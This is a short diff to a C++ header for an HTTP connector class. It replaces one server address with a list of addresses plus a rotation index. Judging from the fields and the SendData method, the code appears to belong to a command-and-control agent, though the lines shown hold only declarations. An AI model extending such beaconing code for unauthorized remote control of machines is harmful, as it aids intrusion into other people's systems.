@@ -31,7 +31,8 @@ class ConnectorHTTP
 	CHAR*     host_header;
 	BOOL      ssl;
 	CHAR*     http_method;
-	CHAR*     server_address;
+	ULONG	  server_count;
+	CHAR**    server_address;
 	WORD      server_port;
 	CHAR*     uri;
 	CHAR*     headers;
@@ -40,10 +41,13 @@ class ConnectorHTTP
 	HINTERNET hInternet = NULL;
 	HINTERNET hConnect  = NULL;
 
+	ULONG server_index = 0;
+
+
 public:
 	ConnectorHTTP();
 
-	void  SetConfig(BOOL Ssl, CHAR* UserAgent, CHAR* Method, CHAR* Address, WORD Port, CHAR* Uri, CHAR* Headers);
+	void  SetConfig(BOOL Ssl, CHAR* UserAgent, CHAR* Method, ULONG AddressCount, CHAR** Address, WORD Port, CHAR* Uri, CHAR* Headers);
 	BYTE* SendData(BYTE* data, ULONG data_size, ULONG* recv_size);
 	void  CloseConnector();
 };
